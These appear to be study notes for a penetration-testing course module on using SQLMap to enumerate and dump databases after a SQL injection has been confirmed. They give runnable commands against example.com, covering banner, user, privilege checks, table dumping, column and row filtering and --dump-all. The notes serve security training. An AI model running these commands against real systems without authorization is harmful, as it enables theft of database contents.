![Image](https://images.openai.com/static-rsc-4/TJj044-juPWmR6JsA3xnrW8soqecuHU8RLCc33CHaNr8z3FHpQIcxfXtCyLKUax0B9uBjNa65CifH1bpr6FSFEib8G05H9aCKOrJOYrs6YLy6sjRuZuC6t4Dh0IdP84GQ1ghnWz98ysVMhD1eNAndQ5keawM_3GrUtf0a96PXXA-tpBNQn5jVMnBJgA5gfUg?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/GtixZfrEB5DrI_ZAPGCk0s0dsIvZVBgkw22b7FXl-aWgBvZ1u8GY9ctHzLiBbU0dnFVxQyLC4ZPBOwkBnDDyfgAMO60GnCk4iPxkEfinFp16k3331_BtFgMkfUA2dHVs6E00zkfxCSgU1WTdhjpUwxiuOjwW2QQNnlJ8aBCPyocQQ090_3EBk7XXMyn_9W5w?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/XpTjfttNBtKSJeXvT341J55HYsbPQFLaGvhMy7-NHcsn5oOri5FcoZWP9Jt8KLUlHb9CH_tqyZLiMlt2H7XsPng21fp9KO5CoxHyvBjm0eHdRgDpNMrCj3Hndan5f3HN5n8L6yI-7roiinlpdwhSyF_92-a7DqnZtBcNRyVAnkIdPBNrSA62oFrh3F8HNyCC?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/R1ebk8cDC9adoC591m61eVfdo6m62oi78z-NVUa9NGxQLeOulvTTHozHxVHhODPSW511RnXaubUR_oDoPa66nj4E9iJaFAROsibHA-G50N43LYUiBToub-paqaMUTVyq3ZawFLcB-kC_3M00cOvVq5zh7vAKsQn0baTrs3bCwRzyXsJzdJOLQfxnqkU1Y1In?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/HU6T9p8kwzn6LFpF6SYguc9N4XQfvtz7WXLAHH6SUwxjuRRPhWKxmeCIVVgsV0hivTX8FnLfDYHotj4cRe_VX-3ZhQy8H-cyZ9OEa-jGiuZTPE3650R4ZRpF03AFsdceAIMOcJuiFEfhMMZe-Wa-5Aj2p4PXWcCnZVx3mAVCuT1_DNPQUWl2sH8YacA9HUbT?purpose=fullsize)

---

## 1. What Is Database Enumeration?

**Enumeration** is the process of looking up and retrieving information from a database after an SQLi vulnerability has been confirmed.

The basic progression is:

```text
SQL Injection detected
        ↓
Exploitability confirmed
        ↓
Database Enumeration
        ↓
Identify DBMS
        ↓
Identify current user
        ↓
Identify current database
        ↓
Enumerate tables
        ↓
Enumerate columns/data
        ↓
Dump relevant information
```

The source describes enumeration as the **central part of an SQL injection attack**, performed after successful detection and confirmation of exploitability.

---

# 2. SQLMap Data Exfiltration

SQLMap contains predefined queries for the DBMSes it supports.

These queries tell SQLMap **which SQL statements to use to retrieve particular types of information**.

For example, the MySQL query definitions include:

```xml
<banner query="VERSION()"/>
<current_user query="CURRENT_USER()"/>
<current_db query="DATABASE()"/>
<hostname query="@@HOSTNAME"/>
```

So SQLMap isn't randomly guessing how to retrieve information.

Conceptually:

```text
SQLMap
   │
   ├── "Give me DB version"
   │        ↓
   │      VERSION()
   │
   ├── "Give me current user"
   │        ↓
   │      CURRENT_USER()
   │
   └── "Give me current database"
            ↓
          DATABASE()
```

---

# 3. In-band vs Blind Enumeration

This is an **important concept**.

SQLMap can use different queries depending on the SQLi technique available.

### In-band

Used when query results can appear directly inside the application's response.

Examples include:

- UNION-based SQLi
    
- Error-based SQLi
    

The source calls this the `inband` approach.

### Blind

Used when the requested data isn't directly displayed.

SQLMap then retrieves information incrementally:

```text
row-by-row
     ↓
column-by-column
     ↓
bit-by-bit
```

The source identifies this as the `blind` approach.

### Mental model

```text
                  SQLi
                   │
          ┌────────┴────────┐
          ▼                 ▼
       In-band             Blind
          │                 │
          ▼                 ▼
 Results appear        Extract indirectly
 in response           and incrementally
```

---

# 4. Basic Database Enumeration

Once SQLMap knows the injection point, you can start retrieving basic database information.

The source identifies four important initial pieces of information:

1. **Database version/banner**
    
2. **Current database user**
    
3. **Current database**
    
4. **Whether the current user has DBA privileges**
    

---

# 5. `--banner`

The option:

```bash
--banner
```

retrieves the database version/banner.

For MySQL, SQLMap uses:

```sql
VERSION()
```

as defined in its query set.

Example:

```bash
sqlmap -u "http://www.example.com/?id=1" --banner
```

The example in the source returned:

```text
banner: '5.1.41-3~bpo50+1'
```

### Why is the banner useful?

It tells you which DBMS/version you're dealing with.

```text
MySQL 5.1.41
      ↓
Old database version
      ↓
Potentially relevant when understanding supported functionality
```

---

# 6. `--current-user`

The option:

```bash
--current-user
```

retrieves the database account being used by the application.

For MySQL, SQLMap uses:

```sql
CURRENT_USER()
```

Example result:

```text
current user: 'root@%'
```

---

# 7. ⚠️ Database `root` ≠ Operating-System `root`

This is a **very important distinction**.

If SQLMap reports:

```text
current user: 'root@%'
```

that means:

> The current account is privileged within the **database system**.

It does **not automatically mean**:

```text
Linux:
root
```

The source explicitly warns that a database `root` account generally has no direct relationship with the OS `root` account.

Think:

```text
Database
   │
   └── root
       ↓
   DB privileges

Operating System
   │
   └── root
       ↓
   OS privileges
```

These are separate privilege contexts.

---

# 8. `--current-db`

The option:

```bash
--current-db
```

retrieves the database currently being used.

For MySQL, SQLMap uses:

```sql
DATABASE()
```

Example:

```text
current database: 'testdb'
```

This is particularly useful because it tells you where to start looking for application data.

---

# 9. `--is-dba`

The option:

```bash
--is-dba
```

checks whether the current database user has DBA/administrator-level privileges within the DBMS.

Example:

```text
current user is DBA: True
```

So the initial enumeration stage can be summarized as:

```text
--banner
    ↓
What DBMS/version?

--current-user
    ↓
Who am I in the DB?

--current-db
    ↓
Which database am I using?

--is-dba
    ↓
How privileged is this DB account?
```

---

# 10. Combining Basic Enumeration

The source demonstrates combining these options:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--banner \
--current-user \
--current-db \
--is-dba
```

The resulting information included:

```text
DBMS:       MySQL >= 5.0
Banner:     5.1.41-3~bpo50+1
User:       root@%
Database:   testdb
DBA:        True
```

---

# 11. SQLMap Session Resumption

Notice something interesting in the example:

```text
[INFO] resuming back-end DBMS 'mysql'
```

and:

```text
sqlmap resumed the following injection point(s)
from stored session
```

This means SQLMap had already identified the injection point during an earlier run.

Instead of starting detection from scratch, SQLMap can use its stored session information.

Conceptually:

```text
First run
   ↓
Detect SQLi
   ↓
Save session
   ↓
Later run
   ↓
Resume known information
   ↓
Start enumeration
```

This can significantly reduce unnecessary requests.

---

# 12. Table Enumeration

Once you know the database name, the next logical step is discovering its tables.

The relevant options are:

```text
--tables
-D <database>
```

Example from the source:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--tables \
-D testdb
```

The result showed:

```text
Database: testdb

[4 tables]

member
data
international
users
```

---

# 13. Database → Tables

This gives us an important enumeration hierarchy:

```text
DATABASE
   │
   ├── member
   ├── data
   ├── international
   └── users
```

Once interesting tables are identified, you can move deeper.

---

# 14. Dumping a Specific Table

Suppose the interesting table is:

```text
users
```

SQLMap can dump it using:

```text
-T users
```

along with:

```text
-D testdb
```

and:

```text
--dump
```

Example:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--dump \
-T users \
-D testdb
```

---

# 15. Example Table Dump

The source produced:

```text
Database: testdb

Table: users

+----+--------+------------+
| id | name   | surname    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+
```

So the enumeration process has progressed from:

```text
Database
   ↓
Table
   ↓
Rows + columns
```

---

# 16. SQLMap Saves Dumped Data

SQLMap also saves the dumped information locally.

The example says:

```text
table 'testdb.users' dumped to CSV file
```

and gives the output location:

```text
.../dump/testdb/users.csv
```

This is useful because you don't have to rely only on the terminal output.

---

# 17. `--dump-format`

By default, SQLMap can output dumped data as CSV.

The source notes that:

```text
--dump-format
```

can be used to choose other formats, including:

```text
CSV
HTML
SQLite
```

### Mental model

```text
Database data
     ↓
   SQLMap
     ↓
┌────┼────┐
CSV HTML SQLite
```

SQLite can be particularly convenient for further database investigation.

---

# 18. Column Enumeration / Selective Dumping

Large tables may contain many columns.

You don't always need everything.

The:

```text
-C
```

option allows you to specify particular columns.

For example:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--dump \
-T users \
-D testdb \
-C name,surname
```

The resulting output contains only:

```text
name
surname
```

---

# 19. Why Selective Enumeration Is Useful

Imagine:

```text
users
 ├── id
 ├── name
 ├── surname
 ├── email
 ├── address
 ├── phone
 ├── created
 ├── updated
 └── ...
```

If you only need:

```text
name
surname
```

then:

```text
-C name,surname
```

avoids retrieving unrelated columns.

Conceptually:

```text
Entire table
      ↓
Select required columns
      ↓
Retrieve only relevant information
```

---

# 20. Row Enumeration

SQLMap also allows you to restrict which rows are retrieved.

The options are:

```text
--start
--stop
```

The source example:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--dump \
-T users \
-D testdb \
--start=2 \
--stop=3
```

returned:

```text
id | name   | surname
---+--------+---------
2  | fluffy | bunny
3  | wu     | ming
```

---

# 21. `--start` and `--stop`

Think:

```text
--start = where to begin
--stop  = where to stop
```

Example:

```text
Rows:

1
2 ← start
3 ← stop
4
```

Only the selected range is retrieved.

---

# 22. Conditional Enumeration — `--where`

Sometimes you don't want rows based purely on their position.

You may have a known condition.

SQLMap provides:

```text
--where
```

Example from the source:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--dump \
-T users \
-D testdb \
--where="name LIKE 'f%'"
```

The result was:

```text
id | name   | surname
---+--------+---------
2  | fluffy | bunny
```

---

# 23. `--where` Mental Model

Think of it as:

```text
Entire table
     ↓
WHERE condition
     ↓
Matching rows only
```

For example:

```text
name LIKE 'f%'
```

means the relevant names begin with `f`.

So:

```text
fluffy → match
luther → no match
wu     → no match
```

---

# 24. Full Database Enumeration

You don't necessarily need to specify one table.

The source explains that:

```bash
--dump -D testdb
```

without:

```text
-T
```

retrieves content from all tables in that database.

Conceptually:

```text
testdb
 │
 ├── table 1 → dump
 ├── table 2 → dump
 ├── table 3 → dump
 └── table 4 → dump
```

---

# 25. `--dump-all`

SQLMap also provides:

```text
--dump-all
```

This goes even broader.

According to the source, it retrieves content from **all databases**.

Hierarchy:

```text
--dump -D testdb
       ↓
All tables in testdb

--dump-all
       ↓
All databases
       ↓
All relevant table contents
```

---

# 26. `--exclude-sysdbs`

When using:

```text
--dump-all
```

the source recommends:

```text
--exclude-sysdbs
```

This tells SQLMap to skip system databases, which are generally of less interest during a penetration test.

Conceptually:

```text
All databases
      │
      ├── Application databases → keep
      │
      └── System databases → exclude
```

---

# 27. Complete Enumeration Workflow 🔥

This is the part I would memorize for HTB.

```text
              Confirmed SQLi
                    │
                    ▼
             Identify DBMS
                    │
                    ▼
               --banner
                    │
                    ▼
           Identify DB account
                    │
                    ▼
           --current-user
                    │
                    ▼
          Identify current DB
                    │
                    ▼
            --current-db
                    │
                    ▼
          Check DB privileges
                    │
                    ▼
               --is-dba
                    │
                    ▼
            Enumerate tables
                    │
                    ▼
             --tables -D DB
                    │
                    ▼
          Choose interesting table
                    │
                    ▼
             --dump -T table
                    │
                    ▼
       Need only certain columns?
                    │
                    ▼
                -C column
                    │
                    ▼
        Need specific rows?
             /              \
            ▼                ▼
       --start/--stop     --where
```

---

# 28. Option Cheat Sheet

|Option|Purpose|
|---|---|
|`--banner`|Database version/banner|
|`--current-user`|Current DB user|
|`--current-db`|Current database|
|`--hostname`|Database server hostname|
|`--is-dba`|Check DBA privileges|
|`--tables`|Enumerate tables|
|`-D`|Specify database|
|`--dump`|Retrieve table/database contents|
|`-T`|Specify table|
|`-C`|Specify columns|
|`--start`|Start row|
|`--stop`|Stop row|
|`--where`|Filter rows using condition|
|`--dump-format`|Choose output format|
|`--dump-all`|Dump across all databases|
|`--exclude-sysdbs`|Exclude system databases|

The options above are directly reflected in the source's enumeration workflow.

---

# 29. The Enumeration Hierarchy

The easiest way to remember the whole topic:

```text
                 DATABASE
                     │
          ┌──────────┴──────────┐
          │                     │
        USER                  TABLES
          │                     │
      --current-user        --tables
                                │
                                ▼
                             TABLE
                                │
                         ┌──────┴──────┐
                         │             │
                      COLUMNS         ROWS
                         │             │
                         ▼             ▼
                        -C        --start/--stop
                                      │
                                      ▼
                                   --where
```

---

# 30. Important Distinctions

### `--current-user`

```text
Who am I?
```

### `--current-db`

```text
Where am I?
```

### `--is-dba`

```text
How privileged am I?
```

### `--tables`

```text
What tables exist?
```

### `--dump`

```text
What data is inside?
```

### `-C`

```text
Which columns do I want?
```

### `--start / --stop`

```text
Which row range?
```

### `--where`

```text
Which rows match my condition?
```

---

# 31. Important Warning: DB Privilege ≠ OS Privilege

This deserves repetition because it can easily cause confusion in HTB.

```text
DB user:
root
```

does **not automatically mean**:

```text
OS:
root
```

Likewise:

```text
DBA: True
```

doesn't automatically prove:

```text
OS administrator/root
```

The source specifically separates DBMS privileges from operating-system privileges.

---

# 32. What Happens After Detection?

The overall SQLMap lifecycle is now becoming clear from the modules you've studied:

```text
1. Target setup
       ↓
2. SQLi detection
       ↓
3. Understand SQLMap output
       ↓
4. Troubleshoot if necessary
       ↓
5. Tune attack if necessary
       ↓
6. Confirm SQLi
       ↓
7. Database enumeration
       ↓
8. Retrieve relevant data
```

And database enumeration itself is:

```text
DBMS
 ↓
User
 ↓
Current DB
 ↓
Privileges
 ↓
Tables
 ↓
Columns
 ↓
Rows
 ↓
Filtered data
```

---

# 🧠 Final Revision Notes

### Basic information

```bash
--banner
--current-user
--current-db
--is-dba
```

### Tables

```bash
--tables -D <database>
```

### Specific table

```bash
--dump -T <table> -D <database>
```

### Specific columns

```bash
-C column1,column2
```

### Specific row range

```bash
--start=2 --stop=3
```

### Conditional rows

```bash
--where="condition"
```

### Whole database

```bash
--dump -D <database>
```

### All databases

```bash
--dump-all
```

### Exclude system databases

```bash
--dump-all --exclude-sysdbs
```

---

## 🔥 One-Line Memory Trick

> **Banner → User → DB → DBA → Tables → Dump → Columns/Rows → Filter**

```text
BANNER
  ↓
USER
  ↓
DATABASE
  ↓
DBA?
  ↓
TABLES
  ↓
DUMP
  ↓
COLUMNS / ROWS
  ↓
WHERE FILTER
```

The core idea from this module is simple: **once SQLMap has a confirmed SQLi point, enumeration turns that vulnerability into structured knowledge about the database—starting with its identity and privileges, then moving down through databases, tables, columns, and rows.**